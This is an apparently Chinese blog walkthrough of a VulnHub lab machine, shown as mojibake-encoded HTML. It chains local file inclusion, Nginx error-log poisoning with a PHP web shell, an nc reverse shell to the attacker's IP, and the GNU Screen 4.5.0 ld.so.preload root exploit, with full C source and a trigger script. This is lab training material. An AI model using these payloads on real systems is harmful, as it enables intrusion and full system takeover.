<p><code>concat.php</code>çš„åº•éƒ¨ä¸ºäº†æ˜¾ç¤ºå’Œ<code>footer.php</code>çš„å®ç°åŠŸèƒ½ï¼Œè‚¯å®šæ˜¯å®ç°äº†æ–‡ä»¶åŒ…å«ï¼Œ</p>
<p><code>concat.php</code>æŠŠ<code>footer.php</code>æ–‡ä»¶åŒ…å«äº†</p>
<p>&#x3D;&#x3D;&gt;æˆ‘ä»¬æ¸—é€çš„åŸºç¡€æ€è·¯å°±å˜æˆäº†<strong>åˆ©ç”¨çš„æ–‡ä»¶åŒ…å«   æ‹¿åˆ°shell</strong></p>
<h3><span id="1éªŒè¯æˆ‘ä»¬çš„æƒ³æ³•">1.éªŒè¯æˆ‘ä»¬çš„æƒ³æ³•</span></h3><p>ã€æ–‡ä»¶åŒ…å«æ³¨å…¥ç‚¹å¯æ§å‚æ•°åä¸€èˆ¬ä¸º<code>file</code>ï¼Œå½“ç„¶å¦‚æœå‡ºç°æ€ä¹ˆéƒ½ä¸è¡Œçš„ï¼Œé‚£å°±å¯ä»¥ç”¨<code>çˆ†ç ´</code>**(fuzz)**æˆ–è€…æˆ‘ä»¬çš„æ€è·¯é”™è¯¯äº†ã€‘</p>
<p>æˆ‘ä»¬å…ˆè¯•è¯•èƒ½ä¸èƒ½åŒ…å«<code>index.php</code></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.143</span>/thankyou.php?file=index.php</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220930194734246.png" alt="image-20220930194734246"></p>
<p>å‘ç°<code>index.php</code>ç¡®å®è¢«æˆ‘ä»¬æˆåŠŸåŒ…å«äº†ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥è‚¯å®šæˆ‘ä»¬çš„æ€è·¯æ˜¯æ²¡æœ‰åç¦»äº†</p>
<h3><span id="2åˆ©ç”¨æ–‡ä»¶åŒ…å«æ‹¿shell">2.åˆ©ç”¨æ–‡ä»¶åŒ…å«æ‹¿shell</span></h3><p>æ—¢ç„¶èƒ½å¤Ÿåœ¨<code>thank.php</code>é‡Œå®ç°æ–‡ä»¶åŒ…å«ï¼Œé‚£æˆ‘ä»¬å°±è¯•è¯•èƒ½ä¸èƒ½åŒ…å«ä¸€äº›æ•æ„Ÿæ–‡ä»¶ï¼Œæ¥è·å–æ›´å¤šä¿¡æ¯</p>
<h4><span id="1å‘nginxé”™è¯¯æ—¥å¿—å¯¼å…¥ä¸€å¥è¯">1ï¼‰å‘Nginxé”™è¯¯æ—¥å¿—å¯¼å…¥ä¸€å¥è¯ğŸ</span></h4><p>æ ¹æ®æˆ‘ä»¬ä¹‹å‰æ”¶é›†çš„ä¿¡æ¯ï¼Œ</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220930190721316.png" alt="image-20220930190721316"></p>
<p>å‘ç°<code>Web server</code>æ˜¯<code>Nginx</code></p>
<blockquote>
<p>Nginxè®¿é—®æ—¥å¿—ï¼šç½‘ç«™è®¿é—®è€…æœ‰å…³çš„æ´»åŠ¨éƒ½è®°å½•åœ¨è®¿é—®æ—¥å¿— &#x2F;&#x2F;<code>access_log</code></p>
<p>Nginxé”™è¯¯æ—¥å¿—ï¼šå½“è®¿é—®é”™è¯¯çš„æ—¶å€™ï¼Œä¼šæŠŠé”™è¯¯å‚æ•°ä¿å­˜åœ¨å…¶ä¸­  &#x2F;&#x2F;<code>error_log</code></p>
</blockquote>
<p>æ‰€ä»¥æˆ‘ä»¬åœ¨æˆ‘ä»¬çš„</p>
<blockquote>
<p><code>url/?file=</code> çš„åé¢åŠ ä¸Šä¸€å¥è¯ğŸï¼Œ<br>ç„¶åå› ä¸ºè®¿é—®é”™è¯¯ï¼Œé”™è¯¯å‚æ•°ã€ä¸€å¥è¯ğŸã€‘å°±ä¼šåˆ°<code>nginxçš„é”™è¯¯æ—¥å¿—</code>ä¸­ï¼Œ<br>ç„¶ååˆ©ç”¨æˆ‘ä»¬å‘ç°çš„æ–‡ä»¶åŒ…å«æŠŠé”™è¯¯æ—¥è®°åŒ…å«åœ¨<code>thankyou.php</code>æ–‡ä»¶ä¸­ï¼Œ<br>è®¿é—®æ‹¿åˆ°<code>shell</code>ï¼Œæ‹¿åˆ°<code>shell</code></p>
</blockquote>
<p><em><code>nginx</code>é…ç½®æ–‡ä»¶ä½ç½®ï¼š</em><em>&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</em>*</p>
<p>æˆ‘ä»¬åŒ…å«è¯¥æ–‡ä»¶çœ‹çœ‹<strong>nginxçš„é”™è¯¯æ—¥å¿—æ–‡ä»¶</strong>ä½ç½®åœ¨å“ªé‡Œ</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220930212030059.png" alt="image-20220930212030059"></p>
<p>çœ‹åˆ°æ–‡ä»¶ä½ç½®</p>
<blockquote>
<p><code>error_logï¼š/var/log/nginx/error.log</code></p>
</blockquote>
<p>å…ˆè¾“å…¥ä¸€å¥è¯ğŸï¼ŒæŠ¥é”™å¯¼å…¥<code>nginx</code>é”™è¯¯æ—¥å¿—</p>
<hr>
<p><strong>key</strong>ï¼šå¦‚æœç›´æ¥åœ¨ç½‘é¡µè¾“å…¥ä¸€å¥è¯ğŸå¯¼å…¥é”™è¯¯æ—¥å¿—æ˜¯æœ‰é—®é¢˜çš„</p>
<blockquote>
<p>å½“æˆ‘ä»¬è®¿é—®<code>http://192.168.133.143/thankyou.php?file=&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></p>
<p>è™½ç„¶ç¡®å®æŠŠè¿™ä¸ªä¿¡æ¯å¯¼å…¥åˆ°äº† <code>/var/log/nginx/error.log</code> æ–‡ä»¶é‡Œ</p>
<p>ä½†æ˜¯å‰ç«¯ä¼¼ä¹å­˜åœ¨è¿‡æ»¤ï¼Œä¼šæŠŠ&lt;&gt;å’Œâ€™â€™æˆ–â€â€ï¼Œæ›¿æ¢æˆå…¶ä»–ç¬¦å·ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬æƒ³è¦åˆ©ç”¨</p>
<p><code>http://192.168.133.143/thankyou.php?file=/var/log/nginx/error.log&amp;cmd=ls</code></p>
<p>è¿™æ ·æƒ³åˆ©ç”¨æˆ‘ä»¬å¯¼å…¥çš„æœ¨é©¬æ‹¿åˆ°shellçš„æ—¶å€™ï¼Œå®é™…ä¸Šæˆ‘ä»¬çš„æœ¨é©¬å·²ç»è¢«ç ´åäº†ï¼Œæ‰€ä»¥æ ¹æœ¬ä¸èƒ½æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„ä¸€ç³»åˆ—å‘½ä»¤ï¼Œæ‰€ä»¥ç”¨æŠ“åŒ…burpç›´æ¥å‘é€åˆ°æœåŠ¡å™¨ï¼Œç»•è¿‡å‰ç«¯è¿‡æ»¤å…ˆï¼Œè¿™æ ·æˆ‘ä»¬çš„ä¸€å¥è¯ğŸæ‰èƒ½å‘æŒ¥å®ƒçš„ä½œç”¨</p>
</blockquote>
<hr>
<p>æ‰€ä»¥æˆ‘ä»¬æ‰§è¡Œ<strong>æŠ“åŒ…æ“ä½œ</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221001221200987.png" alt="image-20221001221200987"></p>
<p>æ²¡æœ‰å…¶ä»–å›æ˜¾å†…å®¹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221001221849004.png" alt="image-20221001221849004"></p>
<p>æˆ‘ä»¬åœ¨æ–‡ä»¶åŒ…å«<code>/var/log/nginx/error.log</code>ï¼Œå¹¶åˆ©ç”¨<code>cmd</code>å‚æ•°æ‰§è¡Œ<code>ls</code>è¯•è¯•ï¼Œçœ‹çœ‹æ˜¯å¦çœŸçš„æŠŠæˆ‘ä»¬çš„æœ¨é©¬åŒ…å«è¿›å»äº†</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221001222035413.png" alt="image-20221001222035413"></p>
<p>å‘ç°ç¡®å®æˆåŠŸåŒ…å«è¿›å»äº†ï¼Œè€Œä¸”è¿˜å¯ä»¥æ‰§è¡Œå‘½ä»¤</p>
<p>é‚£æˆ‘ä»¬ç›´æ¥ç”¨<code>nc</code>å‘½ä»¤åå¼¹<code>shell</code></p>
<h4><span id="2ncå‘½ä»¤åå¼¹shell">2ï¼‰ncå‘½ä»¤åå¼¹shell</span></h4><p>å…ˆåœ¨<code>kali</code>æ§åˆ¶å°æ‰§è¡Œ<code>nc</code>ç›‘å¬<code>8888</code>ç«¯å£</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -l -vv -p <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221001223417288.png" alt="image-20221001223417288"></p>
<p>ç„¶åç½‘é¡µæµè§ˆ</p>
<blockquote>
<p><code>http://192.168.133.144/thankyou.php?file=/var/log/nginx/error.log&amp;cmd=nc%20-nv%20192.168.133.140%208888%20-e%20/bin/bash</code></p>
<p>&#x2F;&#x2F;<code>192.168.133.140</code>æ˜¯è™šæ‹Ÿæœºipï¼Œä¸æ˜¯é¶æœºip</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221001223100801.png" alt="image-20221001223100801"></p>
<p>è¿”å›æ§åˆ¶å°æŸ¥çœ‹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221001223320410.png" alt="image-20221001223320410"></p>
<p>è¿›å…¥<code>shell</code></p>
<p>ç„¶åæ ‡å‡†å§¿åŠ¿ï¼Œè¿›å…¥äº¤äº’å¼shell</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221001223408282.png" alt="image-20221001223408282"></p>
<h4><span id="è·å¾—ç¨³å®šçš„shell">*è·å¾—ç¨³å®šçš„shell</span></h4><p>ã€ä¸ä¼šå› ä¸ºctrl+cé€€å‡ºï¼Œè€Œä¸”å¯ä»¥æŒ‰ä¸Šä¸‹é”®ï¼Œè¿”å›ä¹‹å‰çš„å‘½ä»¤ã€‘</p>
<blockquote>
<p>å…ˆåœ¨shellï¼Œç”¨<code>Ctrl-Z</code>å°†shellæ”¾åˆ°åå°</p>
<p>å†<br><code>stty raw -echo ; fg ; reset</code>  </p>
<p><code>nc -l -vv -p 8888</code>  &#x2F;&#x2F;è¿™ä¸ªä¸ç”¨è¾“å…¥ï¼Œæ˜¯è‡ªåŠ¨æ‰§è¡Œåå°çš„å‘½ä»¤è¿”å›åˆ°å‰å°</p>
<p>&#x2F;&#x2F;stty è®¾ç½®ç»ˆç«¯ç«¯å£è®¾å¤‡çš„æ¥å£é€‰é¡¹</p>
<p>&#x2F;&#x2F;echo è¡¨ç¤ºå›æ˜¾ï¼Œæ¯”å¦‚å½“-echoæ—¶ï¼Œè¾“å…¥lsåæŒ‰å›è½¦ï¼Œä»ç„¶ä¼šçœ‹åˆ°ls</p>
<p>&#x2F;&#x2F;fgæŠŠshellæåˆ°å‰å°æ¥</p>
<p>&#x2F;&#x2F;resetè¡¨ç¤ºé‡å¯ç»ˆç«¯ï¼Œæ­¤æ—¶çš„ç»ˆç«¯ä¸ºæˆ‘ä»¬é¶æœºçš„shellçª—å£ï¼Œæ‰€ä»¥ä¸å®¹æ˜“è¢«é€€å‡ºæˆ–è€…ä¸­æ–­</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221002145951718.png" alt="image-20221002145951718"></p>
<p>æˆåŠŸè·å¾—å…¨äº¤äº’å¼<code>shell</code></p>
<h3><span id="3ææƒ">3.ææƒ</span></h3><p>æ‹¿åˆ°shellä»¥åï¼Œæˆ‘ä»¬æƒé™æ˜æ˜¾æ˜¯ä¸å¤Ÿçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦<strong>å‚ç›´ææƒ</strong>ï¼Œæ‹¿åˆ°æœ€é«˜æƒé™</p>
<p>å…ˆçœ‹çœ‹å­˜ä¸å­˜åœ¨<code>suid</code>æ–¹å¼ææƒ</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221001223927542.png" alt="image-20221001223927542"></p>
<p>ä¼¼ä¹æ²¡å•¥å¯ä»¥åˆ©ç”¨ææƒçš„ç‚¹ï¼Œä½†æ˜¯æœ‰ä¸ª</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221001224134569.png" alt="image-20221001224134569"></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/bin/</span>screen-<span class="number">4.5</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>çœ‹èµ·æ¥æœ‰ç‚¹é™Œç”Ÿï¼Œæˆ‘ä»¬<code>ç™¾åº¦/google</code>å°±è¦åˆ©ç”¨èµ·æ¥äº†</p>
<blockquote>
<p><code>GNU Screen</code>æ˜¯ä¸€æ¬¾ç”±<code>GNU</code>è®¡åˆ’å¼€å‘çš„ç”¨äºå‘½ä»¤è¡Œç»ˆç«¯åˆ‡æ¢çš„è‡ªç”±è½¯ä»¶ã€‚</p>
<p>ç”¨æˆ·å¯ä»¥é€šè¿‡è¯¥è½¯ä»¶åŒæ—¶è¿æ¥å¤šä¸ªæœ¬åœ°æˆ–è¿œç¨‹çš„å‘½ä»¤è¡Œä¼šè¯ï¼Œå¹¶åœ¨å…¶é—´è‡ªç”±åˆ‡æ¢ã€‚</p>
<p><code>GNU Screen</code>å¯ä»¥çœ‹ä½œæ˜¯çª—å£ç®¡ç†å™¨çš„å‘½ä»¤è¡Œç•Œé¢ç‰ˆæœ¬ã€‚</p>
<p>å®ƒæä¾›äº†ç»Ÿä¸€çš„ç®¡ç†å¤šä¸ªä¼šè¯çš„ç•Œé¢å’Œç›¸åº”çš„åŠŸèƒ½ã€‚</p>
</blockquote>
<p>çœ‹æ¥æ˜¯å±äºsuidå½“ä¸­çš„æ¼æ´è„šæœ¬ææƒï¼Œé‚£è„šæœ¬æ€ä¹ˆæ‰¾å‘¢</p>
<h4><span id="1searchsploitæ‰¾ææƒè„šæœ¬æ–‡ä»¶">1ï¼‰searchsploitæ‰¾ææƒè„šæœ¬æ–‡ä»¶</span></h4><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>searchsploit</code>æœç´¢è½¯ä»¶ç›¸å…³æ¼æ´æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„è„šæœ¬ï¼Œè€Œä¸”å®ƒçš„ç‰ˆæœ¬å·ä¹Ÿå†™å‡ºæ¥äº†</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221001224602898.png" alt="image-20221001224602898"></p>
<p>å‘ç°æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ª<code>shè„šæœ¬</code>æ–‡ä»¶ï¼Œä¸€ä¸ª<code>txtæ–‡æœ¬</code>çš„ï¼ˆPOCï¼‰</p>
<p>çœ‹åˆ°æœ‰<code>shè„šæœ¬</code>æ–‡ä»¶è·¯å¾„ï¼Œå…ˆæŸ¥çœ‹å…¶å†…å®¹æ˜¯ä»€ä¹ˆï¼Œçœ‹çœ‹èƒ½ä¸èƒ½åˆ©ç”¨</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221001224718080.png" alt="image-20221001224718080"></p>
<p>å‘ç°æ˜¯ä¸ª<code>cè¯­è¨€è„šæœ¬</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221001224923228.png" alt="image-20221001224923228"></p>
<p>çœ‹æ¥æˆ‘ä»¬æ‰¾çš„æ˜¯æ­£ç¡®çš„ï¼Œæˆ‘ä»¬åˆ†æä¸€ä¸‹è¯¥è„šæœ¬æ–‡ä»¶ï¼Œçœ‹çœ‹æ€ä¹ˆåˆ©ç”¨å…¶æ¥ææƒ</p>
<blockquote>
<p>ä»”ç»†çœ‹å…¶å®è¿™é‡Œé¢æœ‰ä¸¤ä¸ªCè¯­è¨€è„šæœ¬</p>
<p>ã€<code>EOF</code>ä¸ºæ–‡ç»“æŸç¬¦å·ã€‘</p>
<p>è€Œä¸”éœ€è¦ä¿å­˜åˆ°ä¸¤ä¸ªcæ–‡ä»¶ä¸­å»<br><code>libhax.c</code><br><code>rootshell.c</code></p>
<p>ç„¶åç”¨gccå‘½ä»¤<br><code>gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</code><br><code>gcc -o /tmp/rootshell /tmp/rootshell.c</code></p>
<p>å¯¹ä¸¤ä¸ªcæ–‡ä»¶è¿›è¡Œç¼–è¯‘ï¼Œä»è€Œç”Ÿæˆ<br><code>libhax.so</code><br><code>rootshell</code></p>
<p>ç„¶ååœ¨æŠŠä¸¤ä¸ªcæ–‡ä»¶å’Œä¸¤ä¸ªç¼–è¯‘åç”Ÿæˆçš„æ–‡ä»¶ä¼ å…¥é¶æœºå</p>
<p>åœ¨é¶æœºshellæŒ¨ä¸ªæ‰§è¡Œåé¢çš„å‘½ä»¤ï¼Œä»è€Œæ‹¿åˆ°rootæƒé™</p>
<p><code>echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</code><br><code>cd /etc</code><br><code>umask 000 # because</code><br><code>screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</code><br><code>echo &quot;[+] Triggering...&quot;</code><br><code>screen -ls # screen itself is setuid, so... /tmp/rootshell</code>                            </p>
</blockquote>
<p>ä¸ŠåŠéƒ¨åˆ†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221002124640256.png" alt="image-20221002124640256"></p>
<p>ä¸‹åŠéƒ¨åˆ†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221002124701995.png" alt="image-20221002124701995"></p>
<p><strong>&#x3D;&#x3D;&gt;</strong></p>
<p>æˆ‘ä»¬éœ€è¦åœ¨é¶æœºçš„&#x2F;tmpç›®å½•ä¸‹ï¼Œä¼ å…¥</p>
<blockquote>
<p><code>libhax.so</code><br><code>rootshell</code><br><code>flag.sh</code>   &#x2F;&#x2F;å†…å®¹ä¸ºåé¢çš„å‘½ä»¤å†…å®¹</p>
</blockquote>
<p>è¿™ä¸‰ä¸ªæ–‡ä»¶</p>
<p>æˆ‘ä»¬å…ˆåœ¨è‡ªå·±çš„<code>kali</code>æœºä¸ŠæŠŠè¿™ä¸¤ä¸ªæ–‡ä»¶å‡†å¤‡å¥½</p>
<p>æˆ‘ä»¬ä¹Ÿå¯ä»¥å…ˆåˆ°æˆ‘ä»¬<code>kali</code>æœºçš„<code>/tmp</code>ç›®å½•ä¸‹</p>
<p>å…ˆæ‰§è¡Œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221002124843966.png" alt="image-20221002124843966"></p>
<p>å†æ‰§è¡Œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221002124900295.png" alt="image-20221002124900295"></p>
<p>ã€è™½ç„¶ä¼šæŠ¥é”™ï¼Œä½†æ˜¯æ˜¯æ­£å¸¸çš„ï¼Œä¸å½±å“ç¼–è¯‘åäº§ç”Ÿçš„æ–‡ä»¶çš„æ‰§è¡Œã€‘</p>
<p>æ‰§è¡Œå</p>
<blockquote>
<p><code>libhax.so  rootshell</code><br>è¿™ä¸¤ä¸ªæ–‡ä»¶å°±ç”Ÿæˆäº†</p>
</blockquote>
<p>ç„¶åæˆ‘ä»¬çš„<code>flag.sh</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span> <span class="comment"># screen itself is setuid, so...</span></span><br><span class="line">/tmp/rootshell </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221002134454968.png" alt="image-20221002134454968"></p>
<h4><span id="2ncå‘é¶æœºä¼ å…¥è„šæœ¬ææƒæ–‡ä»¶">2ï¼‰ncå‘é¶æœºä¼ å…¥è„šæœ¬ææƒæ–‡ä»¶</span></h4><p><code>å½“ç„¶å¦‚æœä½ ç”¨èšå‰‘è¿æ¥çš„shellçš„è¯ï¼Œç›´æ¥æŠŠæ–‡ä»¶æ‹–è¿›å»å°±è¡Œï¼Œç®€å•ä¸€ç‚¹</code></p>
<p>å¦‚æœç”¨ncçš„è¯å½“ç„¶ä¹Ÿä¸éš¾</p>
<p>å…ˆæ˜¯<code>kali</code>æœºæ§åˆ¶å°ã€ç›®å‰çŠ¶æ€ä¸º<code>/tmp</code>ä¸‹ã€‘</p>
<blockquote>
<p><code>nc -lvp 8888 &lt; libhax.so</code>  &#x2F;&#x2F; &lt; è¡¨ç¤ºä¼ å…¥</p>
</blockquote>
